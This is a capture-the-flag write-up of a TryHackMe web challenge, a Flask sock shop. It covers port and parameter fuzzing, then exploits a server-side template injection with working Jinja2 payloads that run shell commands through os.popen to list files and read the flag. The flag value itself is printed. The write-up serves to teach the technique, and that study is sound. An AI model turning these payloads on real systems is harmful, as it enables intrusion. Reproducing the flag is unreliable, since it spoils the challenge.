+++
title = 'Cozy Christmas Socks Shop (Final)'
categories = ['Web']
date = 2025-12-06
scrollToTop = true
+++

## Challenge Name:

Cozy Christmas Socks Shop (Final)

## Category:

Web

## Challenge Description:

Hvem kunne ikke tænke sig et par fine julesokker? Derfor har nisserne startet deres helt egen butik, tjek deres shop og se, om der skulle være nogle interessante sokker og måske et flag.

Link: https://tryhackme.com/jr/cozychristmassocksshop
Target IP: 10.82.171.129

## Approach

1.  **Reconnaissance**:
    - Started out with a [RustScan](https://github.com/bee-san/RustScan) to enumerate potential open ports
```bash
rustscan -a 10.82.131.15 --ulimit 5000 -- -sV --version-light
```
    - Port 8080 was open, hosting a Flask web application, which also hosted a shop for socks! ![shop](images/shop.png)
    - Utilising [ffuf](https://github.com/ffuf/ffuf) we started enumerating for secret parameters or pages (like sock=1 or page=socks)
    - Fuzzing for parameters (`/?FUZZ=1`) failed to reveal hidden parameters on the root.
    - Fuzzing for pages (`/?page=FUZZ`) revealed a hidden page: `reviews`.

2.  **Vulnerability Discovery**:
    - The `/reviews` page (accessed via `/?page=reviews`) contained a form submitting to `/?test=reviews`.
    - The form inputs (`name`, `review`) were reflected in the response.
    - Testing for [SSTI](https://portswigger.net/web-security/server-side-template-injection) with `name={{7*7}}` resulted in `Hello, 49...`, confirming **Server-Side Template Injection**.
    - The vulnerability existed because the application used `render_template_string` with unescaped user input for GET requests (while POST requests were escaped).

3.  **Exploitation**:
    - I used the SSTI to list files: `{{self.__init__.__globals__.__builtins__.__import__("os").popen("find .").read()}}`.
```bash
Hello, . ./static ./static/fireplace.png ./static/1.png ./static/2.png ./static/6.png ./static/pico.min.css ./static/reindeer.png ./static/gift.png ./static/7.png ./static/3.png ./static/4.png ./static/style.css ./static/8.png ./static/5.png ./templates ./templates/reviews.html ./templates/contact.html.bak ./templates/contact.html ./templates/index.html ./templates/test.html ./templates/socks.html ./templates/about.html ./templates/shop.html ./templates/base.html ./templates/passwd ./templates/reviews2.html ./templates/index2.html ./templates/nosocks.html ./flag ./flag/flag.txt ./app.py , thank you for your review
````

    - This revealed a `flag` directory.
    - I read the flag using `cat flag/flag.txt`.

```bash
{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat flag/flag.txt").read()}}

Hello, NC3{70_p057_0r_N07_70_p057_7He_5571} , thank you for your review
```

## Flag

```text
NC3{70_p057_0r_N07_70_p057_7He_5571}
```

## Reflections and Learnings
- Fuzzing for pages/values is as important as fuzzing for paths.
- Always check if input reflection is vulnerable to SSTI, even if some paths (POST) are secure.